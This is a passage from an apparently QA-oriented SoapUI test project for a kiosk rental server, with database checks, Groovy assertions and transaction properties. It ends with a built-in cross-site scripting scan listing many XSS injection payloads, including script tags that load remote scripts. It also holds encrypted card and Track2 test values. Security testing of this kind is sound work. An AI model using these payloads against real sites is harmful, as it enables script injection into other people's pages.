}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Disc Status" id="726bfbe4-b638-4a41-9104-36ff03888291"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	Physical_Status 
FROM 
	Disc as d
inner join 
	Disc_Transaction as dt
on 
	d.Disc_ID=dt.Disc_ID
where
	 dt.Transaction_ID= :TransactionID</con:query><con:assertion type="GroovyScriptAssertion" name="Assert node [Row]" id="39f9cf12-b464-42a1-82ef-b8f46f0da842"><con:configuration><scriptText>import com.eviware.soapui.support.XmlHolder
import java.util.*

def gv = new com.eviware.soapui.support.GroovyUtils(context);
def rawXML = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]}' )
def holder = gv.getXmlHolder(rawXML)
def nodecount = holder["count(//Results[1]/ResultSet[1]/Row)"]
def physicalstatusArray = [5] ;

def vendedRentals = context.expand( '${#TestCase#VendedRentalBarcodes}' )
def nonVendedRentals = context.expand( '${#TestCase#nonvendedRentalBarcodes}' )
def vendedPurchases = context.expand( '${#TestCase#VendedPurchaseBarcodes}' )
def nonVendedPurchases = context.expand( '${#TestCase#NonVendedPurchaseBarcodes}' )
log.info ("vendedRentals:$vendedRentals; vendedPurchases:$vendedPurchases");

for (i = 1; i &lt;= nodecount.toInteger(); i++)
{
    def responseAsXml = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]/ResultSet[1]/Row['+i+']/PHYSICAL_STATUS[1]}' );
    physicalstatusArray[i-1] = responseAsXml.toInteger();
    //log.info('physicalstatusArray : ' + physicalstatusArray)
}
    if(vendedPurchases != "")
    {
        //log.info("only purchase")
        assert physicalstatusArray.contains(8)
        
    }
    else if(vendedRentals != "")
    {
        //log.info("only Rental")
        assert physicalstatusArray.contains(3)
    }
    else 
    {
        def transactionStatus = context.expand( '${Check Transaction#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]}' );
        if (transactionStatus == '11')
        {
            assert physicalstatusArray.contains(9)
        }
        else
        {
            assert physicalstatusArray.contains(2)
        }        
    }</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TransactionID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Message Control" id="efc0a9ba-ecac-4447-909a-2bc91a3fc385"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	ProcessFlag
FROM 
	MessageControl(nolock)
WHERE
	MessageId = :GUID</con:query><con:assertion type="Simple Contains" name="Contains" id="4e246be7-4cee-4b19-9b66-d23e79c330d8"><con:configuration><token>&lt;PROCESSFLAG>2&lt;/PROCESSFLAG></token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:properties><con:property><con:name>GUID</con:name><con:value>${#TestCase#ReconcileGUID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Reconcile Completed" id="5cf5d8d6-8024-44ed-96e9-b717fc577e99"><con:settings/><con:config><script>//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Update Physical Status = 2 for Digital Codes.
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505 and Title_ID in (Select Title_ID from Title Where FormatId = 17)")</script></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1991328</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149076162</con:value></con:property><con:property><con:name>Email</con:name><con:value>rental.automation@gmail.com</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value>null</con:value></con:property><con:property><con:name>PromoValue</con:name><con:value>0.00</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>RentalVendStatus</con:name><con:value>Vended,Vended</con:value></con:property><con:property><con:name>PurchaseVendStatus</con:name><con:value/></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value/></con:property><con:property><con:name>PurchaseProductType</con:name><con:value/></con:property><con:property><con:name>PurchaseDiscPrice</con:name><con:value/></con:property><con:property><con:name>RentalCount</con:name><con:value>2</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>001505074,001505075</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Games,Games</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>PS4,PS4</con:value></con:property><con:property><con:name>RentalDiscPrice</con:name><con:value>3.00,0</con:value></con:property><con:property><con:name>RentalNonReturnPrice</con:name><con:value>66.00,0</con:value></con:property><con:property><con:name>RentalNonReturnDays</con:name><con:value>22,22</con:value></con:property><con:property><con:name>VendedRentalBarcodes</con:name><con:value>001505074,001505075</con:value></con:property><con:property><con:name>nonvendedRentalBarcodes</con:name><con:value/></con:property><con:property><con:name>VendedRentalsCount</con:name><con:value>2</con:value></con:property><con:property><con:name>rentalPayload</con:name><con:value>{"GroupType" : 1,  "Items" : [{"ProductId" : 10580,"Barcode" : "001505074","VendStatus" : "Vended","ProductFamily" : "Games","ProductType" : "PS4","MultiDisc" : true,"DiscNumber" : 1,"OfferCode" : null,"Pricing" : {"InitialNight" : 3.00,"ExtraNight" : 3.00,"NonReturn" : 66.00,"Expiration" : 3.00,"NonReturnDays" : 22,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 3.00,"DefaultExtraNight" : 3.00},"BlurayUpsell" : null,"ItemSourceType" : 3},{"ProductId" : 10581,"Barcode" : "001505075","VendStatus" : "Vended","ProductFamily" : "Games","ProductType" : "PS4","MultiDisc" : true,"DiscNumber" : 2,"OfferCode" : null,"Pricing" : {"InitialNight" : 0,"ExtraNight" : 0,"NonReturn" : 0,"Expiration" : 0,"NonReturnDays" : 22,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : 1,"DefaultInitialNight" : 0,"DefaultExtraNight" : 0},"BlurayUpsell" : null,"ItemSourceType" : 3}], "Totals" : { "TaxRate" : 9.7500, "Subtotal" : 3, "DiscountedSubtotal" : 0, "TaxAmount" : "0", "GrandTotal" : 0 } }</con:value></con:property><con:property><con:name>VendedPurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>NonVendedPurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>VendedPurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>digitalpurchaseTaxAmt</con:name><con:value/></con:property><con:property><con:name>purchasePayload</con:name><con:value/></con:property><con:property><con:name>IsOffline</con:name><con:value>false</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22Reconcile%22%2C%22MessageId%22%3A+%22ca1a6653-9e2c-46d5-83cf-fa4db28080db%22%2C%22IsOffline%22%3A+false%2C%22Blocklisted%22%3A+false%2C%22Email%22%3A+%22rental.automation%40gmail.com%22%2C%22EngineVersion%22%3A+%221.27.1.297%22%2C%22BundleVersion%22%3A+%222.27.1.65%22%2C%22KioskId%22%3A+1505%2C%22CustomerProfileNumber%22%3A+%2290855364928109%22%2C%22ReferenceNumber%22%3A+1991328%2C%22CreditCard%22%3A+%7B%22FirstName%22%3A+%22Redbox%22%2C%22LastName%22%3A+%22Server%22%2C%22Number%22%3A+%22PkzcmkisWuoEqhaqGMvH63pL59JRWyRNjWqH2WGjvxpN3UuWOOP1EyDNJq8EJbsZIGFGAP0I4VOnehGWfkmUd6SHuhL8tzdux%2B4C6cUeZm4vUubyGBE41cJ0lqEMPo711tI0qFjbRdoXuVdtkALQIEh5Fp5jF5N9hqEFlZ%2Bfvbin%2F%2FQrjaBy%2BM%2FNENKucxbVjPinuoWpDrSGmZQ8Job4fZP8Kbp5HBznmepa9FmkcVoyiTIjmm0JxKS06j3yhGnK%2FbYdO4PNH14sV4WGbIzrzEBIWOcWlt9HQB3j2KzHG0PSLfUvaCFdnoLVqRc6%2FkSqsrFnOox8fiaUJBHAGhmuCglCv6JDFxC5%2FTgjRC0RK%2BKM4wM9j9aSZs%2Bsormkl5LQRYWGZEDSSqKxyKHNc%2BkDianPppfSqD7b8a%2BGafIPvwjczWYinMKxH9wKwCSMeyEH093A5Lx87%2FKu5UQ0yx4lBEoz8SQzs1nDdG%2F6lUUEZrAZhj2S9teot6toILaQe41%2FO5fp7I0%2BIuEb5%2FkjYuIJ9P0Bum20DKyxatoJkQx5Q99sVmffOgvDms339JxX0UofN7IjrVqAPnaUxfFOovA9rCxtZBrSFupB8jzg4IK6KIi6%2BHCq%2BbY3XMKS545jkOVeYoC5Wu3D35R3Fujm8AxIU4%2FDUU5ACCeuImlVyFQJMjw%3D%22%2C%22PostalCode%22%3A+%2260181%22%2C%22ExpirationMonth%22%3A+%2212%22%2C%22ExpirationYear%22%3A+%2220%22%2C%22KeyId%22%3A+100002%2C%22CardId%22%3A+%22%2BJ0VLD%2BoBAw2PaOsD4vmZqEcfpINWgAHbT7dBtTUS7s%3D%22%2C%22LastFour%22%3A+%229709%22%2C%22CardType%22%3A+1%2C%22Track2%22%3A+%22Uvsz1VkFitnBuEu5SZYHciVSo59MVSZKXOtINGL%2FMTRSGs4CVRVv2%2FYPu%2FrE9rjZ%2F4bBNS9ed1hkFE%2Frx89OTRQhjgahc4rYylrC1ArOv2%2FM596qZ5lEI2b3TiS3R8A7zMuY4lwc2At7erTsB%2B8YHH%2BWeS5YlNQpP0F80HQlE8cmkWBkEbDi3AChPr3jz%2BIpE0aTDTmRm3M1UpM0KKs4FUgEO5SZV5SCZ%2BpGbqEB7sswVeTp1WxWyQuuIxoDMJsk1wubUYPCzJFUUtlAhL1%2B24C7BjeNFnwHWzJr9sPwSZbUesQMHpdnR38HbrGZE7vyaII5HB2JOgXc6WSqGEfdozXJO7aBVfQOxrxHytz13kYrShGQ4p7WsLi9wTudoJsv8a2CXGBAgvgsyJ9IkDKTV6xNrrF3ncwM7CW0XLkgfEKKfO4K5KDW%2Bstv0IkZ8QxwXq9MoglzQmBrvc2kWyPZVr5kKWPovckSx2eWs%2FzcJTPoIpHqLWmZOAIrvLb%2FVnqURvu81EiCquBhwDHcVGBpUjCeuLv9hgZJp3c2lKpnrZmTV7hakLk3P9Hk8pSJ9WBux%2FMjM%2F3ZavHxXSXhl6GoOU8rzm0fSKeFGEdQ0Bt5OCGKnj2hZavpZzPE4adpfImjNSUZFcvNqFAufCW%2Fawr25ytQvpi99sx5BA7awsRAKc0%3D%22%7D%2C%22TransactionDate%22%3A+%7B%22theDate%22%3A+636818766466200000%2C%22dateTimeKind%22%3A+%22Unspecified%22%2C%22dateString%22%3A+%222018-12-31T12%3A10%3A46.0000620%22%7D%2C%22PlayPassPromptAccepted%22%3A+false%2C%22PlayPassPointsEarned%22%3A+0%2C%22PropertyBag%22%3A+%7B+%22EarlyIdIndicator%22%3A%22true%22+%7D%2C%22ShoppingCart%22%3A+%7B+%22Groups%22%3A+%5B++%7B%22GroupType%22+%3A+1%2C++%22Items%22+%3A+%5B%7B%22ProductId%22+%3A+10580%2C%22Barcode%22+%3A+%22001505074%22%2C%22VendStatus%22+%3A+%22Vended%22%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22PS4%22%2C%22MultiDisc%22+%3A+true%2C%22DiscNumber%22+%3A+1%2C%22OfferCode%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+3.00%2C%22ExtraNight%22+%3A+3.00%2C%22NonReturn%22+%3A+66.00%2C%22Expiration%22+%3A+3.00%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+3.00%2C%22DefaultExtraNight%22+%3A+3.00%7D%2C%22BlurayUpsell%22+%3A+null%2C%22ItemSourceType%22+%3A+3%7D%2C%7B%22ProductId%22+%3A+10581%2C%22Barcode%22+%3A+%22001505075%22%2C%22VendStatus%22+%3A+%22Vended%22%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22PS4%22%2C%22MultiDisc%22+%3A+true%2C%22DiscNumber%22+%3A+2%2C%22OfferCode%22+%3A+null%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+0%2C%22ExtraNight%22+%3A+0%2C%22NonReturn%22+%3A+0%2C%22Expiration%22+%3A+0%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+0%2C%22DefaultExtraNight%22+%3A+0%7D%2C%22BlurayUpsell%22+%3A+null%2C%22ItemSourceType%22+%3A+3%7D%5D%2C+%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.7500%2C+%22Subtotal%22+%3A+3%2C+%22DiscountedSubtotal%22+%3A+0%2C+%22TaxAmount%22+%3A+%220%22%2C+%22GrandTotal%22+%3A+0+%7D+%7D%5D%2C%22Discounts%22%3A+%5B%7B%22ProductId%22%3A+10580%2C%22DiscountType%22%3A+%22Loyalty%22%2C%22PromotionCode%22%3A+null%2C%22RedemptionPoints%22%3A+2500%2C%22Amount%22%3A+3.00%7D%5D%7D%7D+</con:value></con:property><con:property><con:name>ReconcileGUID</con:name><con:value>ca1a6653-9e2c-46d5-83cf-fa4db28080db</con:value></con:property><con:property><con:name>BarcodeForTnx</con:name><con:value>001505075</con:value></con:property><con:property><con:name>NonVendedBarcodeForTnx</con:name><con:value/></con:property><con:property><con:name>CardType</con:name><con:value>1</con:value></con:property><con:property><con:name>TransactionTotal</con:name><con:value>0.00</con:value></con:property><con:property><con:name>HasPhysicalPurchase</con:name><con:value>false</con:value></con:property><con:property><con:name>CCNumber</con:name><con:value/></con:property><con:property><con:name>CCType</con:name><con:value/></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>90855364928109</con:value></con:property><con:property><con:name>PurchaseFormats</con:name><con:value/></con:property><con:property><con:name>numOfPurchases</con:name><con:value/></con:property><con:property><con:name>RentalFormats</con:name><con:value/></con:property><con:property><con:name>numOfRentals</con:name><con:value/></con:property><con:property><con:name>SetDaysBack</con:name><con:value/></con:property><con:property><con:name>RentalTaxAmount</con:name><con:value/></con:property><con:property><con:name>PurchaseTaxAmount</con:name><con:value/></con:property><con:property><con:name>DiscountedSubTotal</con:name><con:value/></con:property><con:property><con:name>SubTotal</con:name><con:value/></con:property><con:property><con:name>RentalTitleIds</con:name><con:value>10580,10581</con:value></con:property><con:property><con:name>PurchaseTitleIds</con:name><con:value/></con:property><con:property><con:name>LoyaltyFlag</con:name><con:value/></con:property><con:property><con:name>LoyaltyProductPrice</con:name><con:value/></con:property><con:property><con:name>LoyaltyProductId</con:name><con:value/></con:property><con:property><con:name>HasLoyaltyDiscount</con:name><con:value>1</con:value></con:property><con:property><con:name>HasPromoDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>NonLoyaltyProductId</con:name><con:value/></con:property><con:property><con:name>NonLoyaltyProductPrice</con:name><con:value/></con:property><con:property><con:name>testBucket</con:name><con:value/></con:property><con:property><con:name>DiscountTitleIds</con:name><con:value/></con:property><con:property><con:name>DiscountProductPrices</con:name><con:value/></con:property><con:property><con:name>DiscountPayload</con:name><con:value>{"ProductId": 10580,"DiscountType": "Loyalty","PromotionCode": null,"RedemptionPoints": 2500,"Amount": 3.00}</con:value></con:property><con:property><con:name>CCPayload</con:name><con:value>"CreditCard": {"FirstName": "Redbox","LastName": "Server","Number": "PkzcmkisWuoEqhaqGMvH63pL59JRWyRNjWqH2WGjvxpN3UuWOOP1EyDNJq8EJbsZIGFGAP0I4VOnehGWfkmUd6SHuhL8tzdux+4C6cUeZm4vUubyGBE41cJ0lqEMPo711tI0qFjbRdoXuVdtkALQIEh5Fp5jF5N9hqEFlZ+fvbin//QrjaBy+M/NENKucxbVjPinuoWpDrSGmZQ8Job4fZP8Kbp5HBznmepa9FmkcVoyiTIjmm0JxKS06j3yhGnK/bYdO4PNH14sV4WGbIzrzEBIWOcWlt9HQB3j2KzHG0PSLfUvaCFdnoLVqRc6/kSqsrFnOox8fiaUJBHAGhmuCglCv6JDFxC5/TgjRC0RK+KM4wM9j9aSZs+sormkl5LQRYWGZEDSSqKxyKHNc+kDianPppfSqD7b8a+GafIPvwjczWYinMKxH9wKwCSMeyEH093A5Lx87/Ku5UQ0yx4lBEoz8SQzs1nDdG/6lUUEZrAZhj2S9teot6toILaQe41/O5fp7I0+IuEb5/kjYuIJ9P0Bum20DKyxatoJkQx5Q99sVmffOgvDms339JxX0UofN7IjrVqAPnaUxfFOovA9rCxtZBrSFupB8jzg4IK6KIi6+HCq+bY3XMKS545jkOVeYoC5Wu3D35R3Fujm8AxIU4/DUU5ACCeuImlVyFQJMjw=","PostalCode": "60181","ExpirationMonth": "12","ExpirationYear": "20","KeyId": 100002,"CardId": "+J0VLD+oBAw2PaOsD4vmZqEcfpINWgAHbT7dBtTUS7s=","LastFour": "9709","CardType": 1,"Track2": "Uvsz1VkFitnBuEu5SZYHciVSo59MVSZKXOtINGL/MTRSGs4CVRVv2/YPu/rE9rjZ/4bBNS9ed1hkFE/rx89OTRQhjgahc4rYylrC1ArOv2/M596qZ5lEI2b3TiS3R8A7zMuY4lwc2At7erTsB+8YHH+WeS5YlNQpP0F80HQlE8cmkWBkEbDi3AChPr3jz+IpE0aTDTmRm3M1UpM0KKs4FUgEO5SZV5SCZ+pGbqEB7sswVeTp1WxWyQuuIxoDMJsk1wubUYPCzJFUUtlAhL1+24C7BjeNFnwHWzJr9sPwSZbUesQMHpdnR38HbrGZE7vyaII5HB2JOgXc6WSqGEfdozXJO7aBVfQOxrxHytz13kYrShGQ4p7WsLi9wTudoJsv8a2CXGBAgvgsyJ9IkDKTV6xNrrF3ncwM7CW0XLkgfEKKfO4K5KDW+stv0IkZ8QxwXq9MoglzQmBrvc2kWyPZVr5kKWPovckSx2eWs/zcJTPoIpHqLWmZOAIrvLb/VnqURvu81EiCquBhwDHcVGBpUjCeuLv9hgZJp3c2lKpnrZmTV7hakLk3P9Hk8pSJ9WBux/MjM/3ZavHxXSXhl6GoOU8rzm0fSKeFGEdQ0Bt5OCGKnj2hZavpZzPE4adpfImjNSUZFcvNqFAufCW/awr25ytQvpi99sx5BA7awsRAKc0="},</con:value></con:property><con:property><con:name>EstimatedLoyaltyAmount</con:name><con:value>3.00</con:value></con:property><con:property><con:name>EnableServiceFee</con:name><con:value>false</con:value></con:property><con:property><con:name>ServiceFeePayload</con:name><con:value/></con:property><con:property><con:name>UpsellOffer</con:name><con:value/></con:property><con:property><con:name>UpsellOfferStatus</con:name><con:value/></con:property><con:property><con:name>UpsellTypeId</con:name><con:value/></con:property><con:property><con:name>ProductGroupId</con:name><con:value/></con:property><con:property><con:name>HasUpsell</con:name><con:value/></con:property><con:property><con:name>DiscountAmountList</con:name><con:value>3.00</con:value></con:property><con:property><con:name>RCFlag</con:name><con:value>0, 0</con:value></con:property><con:property><con:name>rentalRCFlag</con:name><con:value>0, 0</con:value></con:property><con:property><con:name>purchaseRCFlag</con:name><con:value/></con:property><con:property><con:name>RentalMDVFlag</con:name><con:value>true,true</con:value></con:property><con:property><con:name>RentalMDVDiscNumber</con:name><con:value>1,2</con:value></con:property><con:property><con:name>PurchaseMDVFlag</con:name><con:value/></con:property><con:property><con:name>PurchaseMDVDiscNumber</con:name><con:value/></con:property></con:properties><con:reportParameters/><con:securityTest id="1caa772c-b810-4c52-966a-1262f04139fe" testCaseId="c842226c-710b-4962-ae27-9c6ebb5f34cb" name="SecurityTest 1" failSecurityTestOnScanErrors="true"><con:settings/><con:testStepSecurityTest><con:testStepId>2af8128e-92f2-4612-b53e-f49aac07b35d</con:testStepId><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="98a9ed79-2f3c-442c-83b0-f0681de48168" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE 